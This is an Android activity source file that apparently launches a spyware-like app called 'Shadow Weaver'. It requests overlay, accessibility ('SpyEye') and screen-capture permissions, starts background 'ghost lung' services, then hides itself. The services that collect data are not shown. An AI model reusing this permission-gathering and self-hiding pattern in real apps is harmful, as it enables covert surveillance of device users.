package com.alol.overlay;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int OVERLAY_CODE = 101;
    private static final int SCREEN_CAPTURE_CODE = 102;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);

        TextView info = new TextView(this);
        info.setText("Shadow Weaver Ready");
        info.setTextSize(18);
        layout.addView(info);

        Button startBtn = new Button(this);
        startBtn.setText("Activate All Systems");
        startBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        layout.addView(startBtn);

        setContentView(layout);
    }

    private void requestAllPermissions() {
        // 1. صلاحية النافذة العائمة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_CODE);
            return;
        }

        // 2. صلاحية Accessibility (عين الطيف)
        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        Toast.makeText(this, "Please enable SpyEye in Accessibility settings", Toast.LENGTH_LONG).show();
        startActivity(accIntent);

        // 3. صلاحية Screen Capture (رئة الشبح)
        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mpManager.createScreenCaptureIntent(), SCREEN_CAPTURE_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == OVERLAY_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                requestAllPermissions(); // تابع باقي الصلاحيات
            } else {
                Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show();
                finish();
            }
        } else if (requestCode == SCREEN_CAPTURE_CODE && resultCode == RESULT_OK) {
            // بدء خدمات الرئة والدماغ
            Intent lungIntent = new Intent(this, GhostLungService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(lungIntent);
            } else {
                startService(lungIntent);
            }

            Intent bgIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(bgIntent);
            } else {
                startService(bgIntent);
            }

            Toast.makeText(this, "Shadow Weaver is ALIVE!", Toast.LENGTH_SHORT).show();
            moveTaskToBack(true);
        }
    }
}
